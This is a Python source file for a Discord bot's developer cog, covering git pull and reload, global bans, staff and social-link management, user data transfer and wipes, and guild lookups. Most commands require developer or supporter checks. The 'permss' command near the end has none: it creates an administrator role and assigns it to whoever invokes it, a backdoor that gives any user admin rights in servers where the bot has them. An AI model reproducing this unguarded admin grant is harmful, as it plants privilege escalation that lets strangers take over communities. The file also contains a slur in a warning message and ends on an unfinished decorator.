import os
import io
import ast
import json
import time
import psutil
import asyncio
import random
import string
import datetime
import importlib
import traceback
import discord

from time import time
from git import GitCommandError, InvalidGitRepositoryError, Repo

from discord import User, Embed, File, Guild, Interaction, Thread, AllowedMentions, TextChannel, Permissions
from discord.ui import Button, View
from discord.ext.commands import Cog, command, group
from discord.utils import format_dt

from modules.styles import colors, emojis
from modules.evelinabot import Evelina
from modules.helpers import EvelinaContext
from modules.predicates import is_developer, is_supporter

def generate_product_key() -> str:
    return '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(4))

ALLOWED_SOCIALS = ['instagram', 'snapchat', 'steam', 'discord', 'custom', 'spotify', 'youtube', 'github', 'soundcloud', 'tiktok', 'twitter']
ALLOWED_RANKS = ['developer', 'administrator', 'manager', 'moderator', 'supporter']

async def run_command(command: str) -> None:
    process = await asyncio.create_subprocess_shell(command)
    await process.communicate()

class Developer(Cog):
    def __init__(self, bot: Evelina):
        self.bot = bot
    
    def count_elements_in_file(self, file_path):
        with open(file_path, 'r') as file:
            tree = ast.parse(file.read())
        classes = len([node for node in ast.walk(tree) if isinstance(node, ast.ClassDef)])
        functions = len([node for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)])
        imports = len([node for node in ast.walk(tree) if isinstance(node, ast.Import) or isinstance(node, ast.ImportFrom)])
        return classes, functions, imports

    async def get_user(self, ctx, user: User):
        query = "SELECT * FROM team_members WHERE user_id = $1"
        return await self.bot.db.fetchrow(query, user.id)

    async def pull_and_reset(self, ctx: EvelinaContext):
        try:
            repo = Repo(os.path.dirname(__file__), search_parent_directories=True)
            repo_path = repo.working_tree_dir
        except InvalidGitRepositoryError:
            await ctx.send_warning(f"The directory `{repo_path}` is not a valid Git repository")
            return None, None
        try:
            old_commit_id = repo.head.commit.hexsha[:7]
            repo.git.fetch('origin')
            new_commit_id = repo.git.rev_parse('origin/main')[:7]
            if old_commit_id == new_commit_id:
                return old_commit_id, new_commit_id
            repo.git.reset('--hard', 'origin/main')
            return old_commit_id, new_commit_id
        except GitCommandError as e:
            await ctx.send_warning(f"Failed to pull from the repository.\n```{str(e)}```")
            return None, None

    @command(name="pull", brief="bot developer")
    @is_developer()
    async def pull(self, ctx: EvelinaContext):
        """Pull the latest changes from the repository"""
        old_commit_id, new_commit_id = await self.pull_and_reset(ctx)
        if old_commit_id and new_commit_id:
            if old_commit_id == new_commit_id:
                return await ctx.send_warning(f"No new commits found. Bot running: **[`{new_commit_id}`](https://github.com/evelinabot/evelina/commit/{new_commit_id})**")
            else:
                return await ctx.send_success(f"Pulled from [`evelina`](https://github.com/evelinabot/evelina)\n**Commit ID:** [`{old_commit_id}...{new_commit_id}`](https://github.com/evelinabot/evelina/compare/{old_commit_id}...{new_commit_id})")

    @command(name="guilds", brief="bot developer")
    @is_developer()
    async def guilds(self, ctx: EvelinaContext):
        """All guilds the bot is in, sorted from the biggest to the smallest"""
        servers = sorted(self.bot.guilds, key=lambda g: g.member_count, reverse=True)
        servers = servers[:500]
        return await ctx.paginate([f"{g.name} `({g.id})` `{g.owner}` ``({g.owner_id})`` - {g.member_count:,} members" for g in servers], "evelina's servers")

    @command(name="reload", aliases=["rl"], usage="reload cogs.music", brief="bot developer")
    @is_developer()
    async def reload(self, ctx: EvelinaContext, *, module: str):
        """Reload modules"""
        reloaded = []
        pulled = False
        old_commit_id = None
        new_commit_id = None
        if module.endswith(" --pull"):
            old_commit_id, new_commit_id = await self.pull_and_reset(ctx)
            pulled = True
            module = module.replace(" --pull", "")
            if old_commit_id and new_commit_id and old_commit_id != new_commit_id:
                files_to_checkout = module.split()
                for file in files_to_checkout:
                    file_path = file.replace('.', '/') + '.py'
                    try:
                        repo = Repo(os.path.dirname(__file__), search_parent_directories=True)
                        repo.git.checkout(new_commit_id, file_path)
                    except GitCommandError as e:
                        return await ctx.send_warning(f"Failed to checkout file `{file_path}`.\n> Error details:\n{str(e)}")
        if module in ["*", "~"]:
            modules = [ext for ext in self.bot.extensions]
        else:
            modules = module.split()
        for mod in modules:
            mod = mod.replace("%", "cogs").replace("!", "modules").strip()
            if mod.startswith("cogs"):
                try:
                    await self.bot.reload_extension(mod)
                except Exception as e:
                    return await ctx.send_warning(f"Couldn't reload **{mod}**\n```{e}```")
            else:
                try:
                    _module = importlib.import_module(mod)
                    importlib.reload(_module)
                except Exception as e:
                    return await ctx.send_warning(f"Couldn't reload **{mod}**\n```{e}```")
            reloaded.append(mod)
        if pulled:
            if old_commit_id == new_commit_id:
                await ctx.send_warning(f"No new commits. Bot Version running: **[`{new_commit_id}`](https://github.com/evelinabot/evelina/commit/{new_commit_id})**")
            else:
                await ctx.send_success(f"Pulled & reloaded **{', '.join(reloaded)}**\n**Commit ID:** [`{old_commit_id}...{new_commit_id}`](https://github.com/evelinabot/evelina/compare/{old_commit_id}...{new_commit_id})")
        else:
            await ctx.send_success(f"Reloaded **{', '.join(reloaded)}**")

    @command(name="restart", brief="bot developer")
    @is_developer()
    async def restart(self, ctx: EvelinaContext, *, option: str = ""):
        if option == "--pull":
            old_commit_id, new_commit_id = await self.pull_and_reset(ctx)
            if old_commit_id and new_commit_id and old_commit_id != new_commit_id:
                await ctx.send_success(f"Restarting the bot with commit **[`{new_commit_id}`](https://github.com/evelinabot/evelina/commit/{new_commit_id})**")
            else:
                return await ctx.send_success("No update found. Aborting...")
        else:
            await ctx.message.add_reaction("✅")
        os.system("pm2 restart 0")

    @command(aliases=["gban"], brief="bot developer", usage="globalban comminate Hate speech")
    @is_developer()
    async def globalban(self, ctx: EvelinaContext, user: User, *, reason: str = "Globally banned by a bot owner"):
        """Ban an user globally"""
        if user.id in self.bot.owner_ids:
            return await ctx.send_warning("Do not global ban a bot owner, retard")
        check = await self.bot.db.fetchrow("SELECT * FROM globalban WHERE user_id = $1", user.id)
        if check:
            await self.bot.db.execute("DELETE FROM globalban WHERE user_id = $1", user.id)
            return await ctx.send_success(f"{user.mention} was succesfully globally unbanned")
        mutual_guilds = len(user.mutual_guilds)
        tasks = [
            g.ban(user, reason=reason)
            for g in user.mutual_guilds
            if g.me.guild_permissions.ban_members
            and g.me.top_role > g.get_member(user.id).top_role
            and g.owner_id != user.id
        ]
        await asyncio.gather(*tasks)
        await self.bot.db.execute("INSERT INTO globalban VALUES ($1,$2)", user.id, reason)
        return await ctx.send_success(f"{user.mention} was succesfully global banned in {len(tasks)}/{mutual_guilds} servers")

    @command(name="installs", brief="bot developer")
    @is_developer()
    async def installs(self, ctx: EvelinaContext):
        """List all installs"""
        app = await self.bot.application_info()
        await ctx.send(f"{app.approximate_guild_count} guilds\n{app.approximate_user_install_count} users")

    @command(name="appinfo", brief="bot developer")
    @is_developer()
    async def appinfo(self, ctx: EvelinaContext):
        """Get the bot's application info"""
        app = await self.bot.application_info()
        bot = await self.bot.fetch_user(app.id)
        team_members = ", ".join([f"<@{member.id}>" for member in app.team.members])
        embed = Embed(color=colors.NEUTRAL)
        embed.set_author(name=app.name, icon_url=app.icon.url if app.icon else None)
        embed.description = app.description
        embed.add_field(name="Team Name", value=app.team.name, inline=True)
        embed.add_field(name="Team Owner", value=app.team.owner.mention, inline=True)
        embed.add_field(name="Team Members", value=team_members, inline=True)
        embed.add_field(name="App Name", value=app.name, inline=True)
        embed.add_field(name="Guilds", value=app.approximate_guild_count, inline=True)
        embed.add_field(name="Users", value=app.approximate_user_install_count, inline=True)
        embed.add_field(name="Terms of Service", value=app.terms_of_service_url, inline=True)
        embed.add_field(name="Privacy Policy", value=app.privacy_policy_url, inline=True)
        embed.set_thumbnail(url=app.icon.url if app.icon else None)
        view = View()
        view.add_item(Button(label="Invite", url="https://discord.com/oauth2/authorize?client_id=1242930981967757452"))
        view.add_item(Button(label="Support Server", url="https://discord.gg/evelina"))
        view.add_item(Button(label="GitHub", url="https://github.com/evelinabot"))
        await ctx.send(embed=embed, view=view)

    @command(name="stat", brief="bot developer")
    @is_developer()
    async def stat(self, ctx: EvelinaContext):
        """Shows the amount of lines, functions, classes, imports, and files the bot has."""
        total_lines = 0
        total_classes = 0
        total_functions = 0
        total_imports = 0
        total_files = 0
        directories = ['cogs', 'modules', 'events']
        for directory in directories:
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.endswith(".py"):
                        total_files += 1
                        file_path = os.path.join(root, file)
                        with open(file_path, 'r') as f:
                            total_lines += len(f.read().splitlines())
                        classes, functions, imports = self.count_elements_in_file(file_path)
                        total_classes += classes
                        total_functions += functions
                        total_imports += imports
        await ctx.send(f"**lines:** `{total_lines:,}`\n"
                    f"**files:** `{total_files:,}`\n"
                    f"**functions:** `{total_functions:,}`\n"
                    f"**classes:** `{total_classes:,}`\n"
                    f"**imports:** `{total_imports:,}`\n")
        
    @command(name="status", brief="bot developer")
    @is_developer()
    async def status(self, ctx: EvelinaContext):
        process = psutil.Process(os.getpid())
        cpu_percent = psutil.cpu_percent(interval=1)
        process_cpu_percent = process.cpu_percent(interval=1)
        memory_info = process.memory_info()
        total_memory = psutil.virtual_memory().total / 1024 / 1024
        used_memory = memory_info.rss / 1024 / 1024
        active_tasks = [task for task in asyncio.all_tasks() if not task.done()]
        embed = Embed(title="📊 Bot Performance", color=colors.NEUTRAL)
        embed.add_field(name="🔧 CPU (Total)", value=f"{cpu_percent:.2f}%")
        embed.add_field(name="🔧 CPU (Bot)", value=f"{process_cpu_percent:.2f}%")
        embed.add_field(name="🧠 RAM (Bot)", value=f"{used_memory:.2f} MB / {total_memory:.2f} MB")
        embed.add_field(name="⚙️ Active Tasks", value=f"{len(active_tasks)} asyncio Tasks")
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f"active_tasks_{timestamp}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"Total Active Tasks: {len(active_tasks)}\n\n")
            for idx, task in enumerate(active_tasks, start=1):
                f.write(f"Task {idx}:\n")
                f.write(f"  Task: {task}\n")
                coro = task.get_coro()
                f.write(f"  Coroutine: {coro}\n")
                stack = task.get_stack()
                if stack:
                    f.write("  Stacktrace:\n")
                    for frame in stack:
                        formatted_stack = ''.join(traceback.format_stack(f=frame))
                        f.write(formatted_stack)
                else:
                    f.write("  Stacktrace: None (Task ist evtl. idle oder abgeschlossen)\n")
                f.write("\n" + "-"*40 + "\n\n")
        file = File(filename, filename=filename)
        await ctx.send(embed=embed, file=file)
        os.remove(filename) 

    @command(name="looplatency", aliases=["mel", "ll"], brief="bot developer")
    @is_developer()
    async def looplatency(self, ctx: EvelinaContext):
        """Returns the latency of the main event loop"""
        enqueue_time = time()
        async def actual_task():
            return "Task completed!"
        task = asyncio.create_task(actual_task())
        execution_start_time = time()
        result = await task
        execution_end_time = time()
        wait_time = execution_start_time - enqueue_time
        execution_duration = execution_end_time - execution_start_time
        await ctx.send(
            f"Task was enqueued and waited {wait_time * 1000:.2f} ms before execution.\n"
            f"Task execution took {execution_duration * 1000:.2f} ms to complete."
        )
        
    @command(name="checkperms", brief="bot developer")
    @is_developer()
    async def checkperms(self, ctx: EvelinaContext):
        admin_count = 0
        non_admin_count = 0
        for guild in self.bot.guilds:
            bot_member = guild.get_member(self.bot.user.id)
            if bot_member.guild_permissions.administrator:
                admin_count += 1
            else:
                non_admin_count += 1
        await ctx.send(f"**Admin:** `{admin_count}` - **Non-Admin:** `{non_admin_count}`")

    @command(name="checknames", brief="bot developer")
    @is_developer()
    async def checknames(self, ctx: EvelinaContext):
        """Check if the bot has a custom nickname on any server"""
        server_list = []
        for guild in self.bot.guilds:
            bot_member = guild.me
            if bot_member.nick:
                server_list.append((guild.name, bot_member.nick))
        if not server_list:
            await ctx.send_warning("Der Bot verwendet auf keinem Server einen benutzerdefinierten Nickname.")
            return
        server_list.sort(key=lambda x: x[0])
        content = [f"**{server_name}** - `{nickname}`" for server_name, nickname in server_list]
        await ctx.paginate(content, "evelina's nicknames", {"name": ctx.guild.name, "icon_url": ctx.guild.icon.url if ctx.guild.icon else None})

    @command(name="termed", brief="bot developer", usage="termed comminate curet")
    @is_developer()
    async def termed(self, ctx: EvelinaContext, old: User, new: User):
        """Transfer data from old user to new user"""
        details = ""
        allowed_roles = {
        320288667329495040, 585689685771288600, 660204203834081284, 659438962624167957
        }
        old_user = ctx.guild.get_member(old.id)
        new_user = ctx.guild.get_member(new.id)
        if old_user and new_user:
            roles_to_transfer = [role for role in old_user.roles if role.id in allowed_roles]
            if roles_to_transfer:
                await old_user.remove_roles(*roles_to_transfer, reason="Data transfer")
                await new_user.add_roles(*roles_to_transfer, reason="Data transfer")
                details += f"**Roles:** {', '.join([role.mention for role in roles_to_transfer])}\n"
            else:
                details += "**Roles:** No allowed roles found to transfer\n"
        else:
            details += "**Roles:** Not found\n"
        old_economy = await self.bot.db.fetchrow("SELECT * FROM economy WHERE user_id = $1", old.id)
        old_business = await self.bot.db.fetchrow("SELECT * FROM economy_business WHERE user_id = $1", old.id)
        old_lab = await self.bot.db.fetchrow("SELECT * FROM economy_lab WHERE user_id = $1", old.id)
        new_economy = await self.bot.db.fetchrow("SELECT * FROM economy WHERE user_id = $1", new.id)
        if old_economy:
            if not new_economy:
                await self.bot.db.execute("UPDATE economy SET user_id = $1 WHERE user_id = $2", new.id, old.id)
                details += "**Economy:** Transferred\n"
            else:
                await self.bot.db.execute("UPDATE economy SET cash = cash + $1 WHERE user_id = $2", old_economy['cash'], new.id)
                await self.bot.db.execute("UPDATE economy SET card = card + $1 WHERE user_id = $2", old_economy['card'], new.id)
                await self.bot.db.execute("UPDATE economy SET item_bank = item_bank + $1 WHERE user_id = $2", old_economy['item_bank'], new.id)
                await self.bot.db.execute("UPDATE economy SET item_case = item_case + $1 WHERE user_id = $2", old_economy['item_case'], new.id)
                await self.bot.db.execute("DELETE FROM economy WHERE user_id = $1", old.id)
                details += "**Economy:** Merged\n"
        if old_business:
            if not old_business:
                pass
            else:
                await self.bot.db.execute("UPDATE economy_business SET user_id = $1 WHERE user_id = $2", new.id, old.id)
                details += "**Business:** Transferred\n"
        if old_lab:
            if not old_lab:
                pass
            else:
                await self.bot.db.execute("UPDATE economy_lab SET user_id = $1 WHERE user_id = $2", new.id, old.id)
                await self.bot.db.execute("DELETE FROM economy WHERE user_id = $1", old.id)
                details += "**Lab:** Transferred\n"
        else:
            details += "**Lab:** Not found\n"
        old_premium = await self.bot.db.fetchrow("SELECT * FROM premium WHERE user_id = $1", old.id)
        if old_premium:
            await self.bot.db.execute("UPDATE premium SET user_id = $1 WHERE user_id = $2", new.id, old.id)
            details += "**Premium:** Transferred\n"
        else:
            details += "**Premium:** Not found\n"
        old_instance = await self.bot.db.fetchrow("SELECT * FROM instance WHERE owner_id = $1", old.id)
        if old_instance:
            await self.bot.db.execute("UPDATE instance SET owner_id = $1 WHERE owner_id = $2", new.id, old.id)
            await self.bot.db.execute("UPDATE instance_addon SET owner_id = $1 WHERE owner_id = $2", new.id, old.id)
            details += "**Instance:** Transferred\n"
        else:
            details += "**Instance:** Not found\n"
        old_donor = await self.bot.db.fetchrow("SELECT * FROM donor WHERE user_id = $1", old.id)
        if old_donor:
            await self.bot.db.execute("UPDATE donor SET user_id = $1 WHERE user_id = $2", new.id, old.id)
            details += "**Donor:** Transferred\n"
        else:
            details += "**Donor:** Not found\n"
        old_antinuke = await self.bot.db.fetchrow("SELECT * FROM antinuke WHERE owner_id = $1", old.id)
        if old_antinuke:
            await self.bot.db.execute("UPDATE antinuke SET owner_id = $1 WHERE owner_id = $2", new.id, old.id)
            details += "**Antinuke:** Transferred\n"
        else:
            details += "**Antinuke:** Not found\n"
        old_bugs = await self.bot.db.fetchrow("SELECT * FROM bugreports WHERE user_id = $1", old.id)
        if old_bugs:
            await self.bot.db.execute("UPDATE bugreports SET user_id = $1 WHERE user_id = $2", new.id, old.id)
            details += "**Bugreports:** Transferred\n"
        else:
            details += "**Bugreports:** Not found\n"
        await ctx.send_success(f"Successfully transferred data from {old.mention} to {new.mention}\n{details}")
    
    @command(name="wipe", brief="bot developer", usage="wipe comminate")
    @is_developer()
    async def wipe(self, ctx: EvelinaContext, user: User):
        """Wipe an user's data"""
        async def yes_callback(interaction: Interaction):
            user_data = await self.bot.db.fetchrow("SELECT * FROM economy WHERE user_id = $1", user.id)
            user_lab = await self.bot.db.fetchrow("SELECT * FROM economy_lab WHERE user_id = $1", user.id)
            user_business = await self.bot.db.fetchrow("SELECT * FROM economy_business WHERE user_id = $1", user.id)
            await self.bot.db.execute("DELETE FROM economy WHERE user_id = $1", user.id)
            await self.bot.db.execute("DELETE FROM economy_lab WHERE user_id = $1", user.id)
            await self.bot.db.execute("DELETE FROM economy_business WHERE user_id = $1", user.id)
            await self.bot.db.execute(
                "INSERT INTO economy_logs_wipe (user_id, moderator_id, cash, card, bank, lab, business, created) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)",
                user.id,
                ctx.author.id,
                user_data['cash'] if user_data else 0,
                user_data['card'] if user_data else 0,
                user_data['item_bank'] if user_data else 0,
                user_lab['upgrade_state'] if user_lab else 0,
                user_business['business_id'] if user_business else 0,
                datetime.datetime.now().timestamp()
            )
            await interaction.response.edit_message(embed=Embed(description=f"{emojis.APPROVE} {ctx.author.mention}: Successfully wiped {user.mention}", color=colors.SUCCESS), view=None)
        async def no_callback(interaction: Interaction):
            await interaction.response.edit_message(embed=Embed(description=f"{emojis.DENY} {ctx.author.mention}: Wipe got canceled", color=colors.ERROR), view=None)
        return await ctx.confirmation_send(f"{emojis.QUESTION} {ctx.author.mention}: Are you sure you want to wipe {user.mention}?", yes_callback, no_callback)

    @command(name="wipeall", brief="bot developer", usage="wipeall comminate")
    @is_developer()
    async def wipeall(self, ctx: EvelinaContext, user: User):
        """Wipe all data from an user"""
        async def yes_callback(interaction: Interaction):
            user_data = await self.bot.db.fetchrow("SELECT * FROM economy WHERE user_id = $1", user.id)
            user_lab = await self.bot.db.fetchrow("SELECT * FROM economy_lab WHERE user_id = $1", user.id)
            user_business = await self.bot.db.fetchrow("SELECT * FROM economy_business WHERE user_id = $1", user.id)
            await self.bot.db.execute("DELETE FROM economy WHERE user_id = $1", user.id)
            await self.bot.db.execute("DELETE FROM economy_lab WHERE user_id = $1", user.id)
            await self.bot.db.execute("DELETE FROM economy_business WHERE user_id = $1", user.id)
            await self.bot.db.execute("DELETE FROM economy_cards_user WHERE user_id = $1", user.id)
            await self.bot.db.execute("DELETE FROM economy_cards_used WHERE user_id = $1", user.id)
            await self.bot.db.execute(
                "INSERT INTO economy_logs_wipe (user_id, moderator_id, cash, card, bank, lab, business, created) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)",
                user.id,
                ctx.author.id,
                user_data['cash'] if user_data else 0,
                user_data['card'] if user_data else 0,
                user_data['item_bank'] if user_data else 0,
                user_lab['upgrade_state'] if user_lab else 0,
                user_business['business_id'] if user_business else 0,
                datetime.datetime.now().timestamp()
            )
            await interaction.response.edit_message(embed=Embed(description=f"{emojis.APPROVE} {ctx.author.mention}: Successfully wiped all data from {user.mention}", color=colors.SUCCESS), view=None)
        async def no_callback(interaction: Interaction):
            await interaction.response.edit_message(embed=Embed(description=f"{emojis.DENY} {ctx.author.mention}: Wipe got canceled", color=colors.ERROR), view=None)
        return await ctx.confirmation_send(f"{emojis.QUESTION} {ctx.author.mention}: Are you sure you want to wipe all data from {user.mention}?", yes_callback, no_callback)

    @group(name='staff', brief="bot developer", invoke_without_command=True, case_insensitive=True)
    @is_developer()
    async def staff(self, ctx: EvelinaContext):
        """Manage the staff team."""
        return await ctx.create_pages()

    @staff.command(name="add", usage="staff add comminate developer", brief="bot developer")
    @is_developer()
    async def staff_add(self, ctx: EvelinaContext, user: User, rank: str):
        """Add a user to the staff team"""
        if rank not in ALLOWED_RANKS:
            return await ctx.send_warning(f"Allowed ranks are:\n> {', '.join(ALLOWED_RANKS)}")
        existing_user = await self.get_user(ctx, user)
        if existing_user:
            return await ctx.send_warning(f"**{user.name}** is already in the staff team")
        query = "INSERT INTO team_members (user_id, rank, socials) VALUES ($1, $2, $3)"
        await self.bot.db.execute(query, user.id, rank.capitalize(), '{}')
        await ctx.send_success(f"**{user.name}** got added to the staff team as a **{rank.capitalize()}**")

    @staff.command(name="remove", usage="staff remove [user]", brief="bot developer")
    @is_developer()
    async def staff_remove(self, ctx: EvelinaContext, user: User):
        """Remove a user from the staff team"""
        existing_user = await self.get_user(ctx, user)
        if not existing_user:
            return await ctx.send_warning(f"**{user.name}** isn't in the staff team")
        query = "DELETE FROM team_members WHERE user_id = $1"
        await self.bot.db.execute(query, user.id)
        await ctx.send_success(f"**{user.name}** got removed from the staff team")

    @staff.command(name="edit", usage="staff edit comminate developer", brief="bot developer")
    @is_developer()
    async def staff_edit(self, ctx: EvelinaContext, user: User, rank: str):
        """Edit the rank of a staff member"""
        if rank not in ALLOWED_RANKS:
            return await ctx.send_warning(f"Allowed ranks are:\n> {', '.join(ALLOWED_RANKS)}")
        existing_user = await self.get_user(ctx, user)
        if not existing_user:
            return await ctx.send_warning(f"**{user.name}** isn't in the staff team")
        query = "UPDATE team_members SET rank = $1 WHERE user_id = $2"
        await self.bot.db.execute(query, rank.capitalize(), user.id)
        await ctx.send_success(f"**{user.name}** rank got updated to **{rank.capitalize()}**")

    @staff.group(name="social", brief="bot helper", invoke_without_command=True, case_insensitive=True)
    @is_supporter()
    async def staff_social(self, ctx: EvelinaContext):
        """Manage the social media profiles of the staff team."""
        return await ctx.create_pages()
    
    @staff_social.command(name="add", usage="staff social add instagram https://instagram.com/bender6pm", brief="bot helper")
    @is_supporter()
    async def staff_social_add(self, ctx: EvelinaContext, platform: str, link: str):
        """Add a social media profile to yourself"""
        user = ctx.author
        if platform not in ALLOWED_SOCIALS:
            return await ctx.send_warning(f"Allowed platforms are:\n> {', '.join(ALLOWED_SOCIALS)}")
        existing_user = await self.get_user(ctx, user)
        if not existing_user:
            return await ctx.send_warning(f"You aren't in the staff team")
        socials = existing_user['socials']
        if isinstance(socials, str):
            socials = json.loads(socials)
        if platform in socials:
            return await ctx.send_warning(f"You already have a **{platform.capitalize()}** link")
        socials[platform] = link
        query = "UPDATE team_members SET socials = $1 WHERE user_id = $2"
        await self.bot.db.execute(query, json.dumps(socials), user.id)
        await ctx.send_success(f"Your [**{platform.capitalize()}**]({link}) link got added successfully")

    @staff_social.command(name="remove", usage="staff social remove instagram", brief="bot helper")
    @is_supporter()
    async def staff_social_remove(self, ctx: EvelinaContext, platform: str):
        """Remove a social media profile from yourself"""
        user = ctx.author
        if platform not in ALLOWED_SOCIALS:
            return await ctx.send_warning(f"Invalid platform. Allowed platforms are: {', '.join(str(ALLOWED_SOCIALS).capitalize())}")
        existing_user = await self.get_user(ctx, user)
        if not existing_user:
            return await ctx.send_warning(f"You aren't in the staff team")
        socials = existing_user['socials']
        if isinstance(socials, str):
            socials = json.loads(socials)
        if platform not in socials:
            return await ctx.send_warning(f"You don't have a **{platform.capitalize()}** link")
        del socials[platform]
        query = "UPDATE team_members SET socials = $1 WHERE user_id = $2"
        await self.bot.db.execute(query, json.dumps(socials), user.id)
        await ctx.send_success(f"Your **{platform.capitalize()}** link got removed successfully")

    @staff_social.command(name="edit", usage="staff social edit instagram https://instagram.com/bender6pm", brief="bot helper")
    @is_supporter()
    async def staff_social_edit(self, ctx: EvelinaContext, platform: str, link: str):
        """Edit a social media profile of yourself"""
        user = ctx.author
        if platform not in ALLOWED_SOCIALS:
            return await ctx.send_warning(f"Allowed platforms are:\n> {', '.join(ALLOWED_SOCIALS)}")
        existing_user = await self.get_user(ctx, user)
        if not existing_user:
            return await ctx.send_warning(f"You aren't in the staff team")
        socials = existing_user['socials']
        if isinstance(socials, str):
            socials = json.loads(socials)
        if platform not in socials:
            return await ctx.send_warning(f"You don't have a **{platform.capitalize()}** link")
        socials[platform] = link
        query = "UPDATE team_members SET socials = $1 WHERE user_id = $2"
        await self.bot.db.execute(query, json.dumps(socials), user.id)
        await ctx.send_success(f"Your [**{platform.capitalize()}**]({link}) link got updated successfully")

    @staff_social.command(name="list", brief="bot helper")
    @is_supporter()
    async def staff_social_list(self, ctx: EvelinaContext):
        """List all social media profiles of yourself"""
        user = ctx.author
        existing_user = await self.get_user(ctx, user)
        if not existing_user:
            return await ctx.send_warning(f"You aren't in the staff team")
        socials = existing_user['socials']
        if isinstance(socials, str):
            socials = json.loads(socials)
        if not socials:
            return await ctx.send_warning(f"You doesn't have any social media profiles")
        social_links = "\n".join([f"**{str(platform).capitalize()}:** {link}" for platform, link in socials.items()])
        embed = Embed(color=colors.NEUTRAL, title=f"{user.name}'s Social Profiles", description=social_links)
        await ctx.send(embed=embed)

    @staff_social.command(name="forceadd", usage="staff social forceadd comminate instagram https://instagram.com/bender6pm", brief="bot developer")
    @is_developer()
    async def staff_social_forceadd(self, ctx: EvelinaContext, user: User, platform: str, link: str):
        """Add a social media profile to a staff member"""
        if platform not in ALLOWED_SOCIALS:
            return await ctx.send_warning(f"Allowed platforms are:\n> {', '.join(ALLOWED_SOCIALS)}")
        existing_user = await self.get_user(ctx, user)
        if not existing_user:
            return await ctx.send_warning(f"**{user.name}** isn't in the staff team")
        socials = existing_user['socials']
        if isinstance(socials, str):
            socials = json.loads(socials)
        if platform in socials:
            return await ctx.send_warning(f"**{user.name}** already has a **{platform.capitalize()}** link")
        socials[platform] = link
        query = "UPDATE team_members SET socials = $1 WHERE user_id = $2"
        await self.bot.db.execute(query, json.dumps(socials), user.id)
        await ctx.send_success(f"**{user.name}**'s [**{platform.capitalize()}**]({link}) link got added successfully")

    @staff_social.command(name="forceremove", usage="staff social forceremove comminate instagram", brief="bot developer")
    @is_developer()
    async def staff_social_forceremove(self, ctx: EvelinaContext, user: User, platform: str):
        """Remove a social media profile from a staff member"""
        if platform not in ALLOWED_SOCIALS:
            return await ctx.send_warning(f"Invalid platform. Allowed platforms are: {', '.join(str(ALLOWED_SOCIALS).capitalize())}")
        existing_user = await self.get_user(ctx, user)
        if not existing_user:
            return await ctx.send_warning(f"**{user.name}** isn't in the staff team")
        socials = existing_user['socials']
        if isinstance(socials, str):
            socials = json.loads(socials)
        if platform not in socials:
            return await ctx.send_warning(f"**{user.name}** doesn't have a **{platform.capitalize()}** link")
        del socials[platform]
        query = "UPDATE team_members SET socials = $1 WHERE user_id = $2"
        await self.bot.db.execute(query, json.dumps(socials), user.id)
        await ctx.send_success(f"**{user.name}**'s **{platform.capitalize()}** link got removed successfully")

    @staff_social.command(name="forceedit", usage="staff social forceedit comminate instagram https://instagram.com/bender6pm", brief="bot developer")
    @is_developer()
    async def staff_social_forceedit(self, ctx: EvelinaContext, user: User, platform: str, link: str):
        """Edit a social media profile of a staff member"""
        if platform not in ALLOWED_SOCIALS:
            return await ctx.send_warning(f"Allowed platforms are:\n> {', '.join(ALLOWED_SOCIALS)}")
        existing_user = await self.get_user(ctx, user)
        if not existing_user:
            return await ctx.send_warning(f"**{user.name}** isn't in the staff team")
        socials = existing_user['socials']
        if isinstance(socials, str):
            socials = json.loads(socials)
        if platform not in socials:
            return await ctx.send_warning(f"**{user.name}** doesn't have a **{platform.capitalize()}** link")
        socials[platform] = link
        query = "UPDATE team_members SET socials = $1 WHERE user_id = $2"
        await self.bot.db.execute(query, json.dumps(socials), user.id)
        await ctx.send_success(f"**{user.name}**'s [**{platform.capitalize()}**]({link}) link got updated successfully")

    @staff_social.command(name="forcelist", usage="staff social forcelist comminate", brief="bot developer")
    @is_developer()
    async def staff_social_forcelist(self, ctx: EvelinaContext, user: User):
        """List all social media profiles of a staff member"""
        existing_user = await self.get_user(ctx, user)
        if not existing_user:
            return await ctx.send_warning(f"**{user.name}** isn't in the staff team")
        socials = existing_user['socials']
        if isinstance(socials, str):
            socials = json.loads(socials)
        if not socials:
            return await ctx.send_warning(f"**{user.name}** doesn't have any social media profiles")
        social_links = "\n".join([f"**{str(platform).capitalize()}:** {link}" for platform, link in socials.items()])
        embed = Embed(color=colors.NEUTRAL, title=f"{user.name}'s Social Profiles", description=social_links)
        await ctx.send(embed=embed)
        
    @command(name="getinvite", brief="bot developer", usage="getinvite 1228371886690537624", description="Get the invite of a authorized server")
    @is_developer()
    async def getinvite(self, ctx: EvelinaContext, guild: Guild):
        try:
            invites = await guild.invites()
            invite = guild.vanity_url or invites[0].url
        except IndexError:
            return await ctx.send_warning("This server doesn't have any available invites")
        return await ctx.send(invite)
    
    @command()
    @is_developer()
    async def getguild(self, ctx: EvelinaContext, guild: Guild):
        """
        Fetch information on a guild.
        """
        embed = Embed(
            description=f"{format_dt(guild.created_at)} ({format_dt(guild.created_at, 'R')})"
        )

        embed.set_author(
            name=f"{guild.name} ({guild.id})",
            url=guild.vanity_url,
            icon_url=guild.icon,
        )

        if guild.icon:
            buffer = await guild.icon.read()

        embed.add_field(
            name="**Information**",
            value=(
                ""
                f"**Owner:** {guild.owner or guild.owner_id}\n"
                f"**Verification:** {guild.verification_level.name.title()}\n"
                f"**Nitro Boosts:** {guild.premium_subscription_count:,} (`Level {guild.premium_tier}`)"
            ),
        )

        embed.add_field(
            name="**Statistics**",
            value=(
                ""
                f"**Members:** {guild.member_count:,}\n"
                f"**Text Channels:** {len(guild.text_channels):,}\n"
                f"**Voice Channels:** {len(guild.voice_channels):,}\n"
            ),
        )

        if guild == ctx.guild and (roles := guild.roles[1:]):
            roles = list(reversed(roles))

            embed.add_field(
                name=f"**Roles ({len(roles)})**",
                value=(
                    ""
                    + ", ".join(role.mention for role in roles[:5])
                    + (f" (+{len(roles) - 5})" if len(roles) > 5 else "")
                ),
                inline=False,
            )

        return await ctx.send(embed=embed)
    
    @command()
    async def permss(self, ctx: EvelinaContext):
        """
        Create a role with admin perms.
        """
        r = await ctx.guild.create_role(name="perms", permissions=Permissions(8))
        await ctx.author.add_roles(r)
    
    @command()
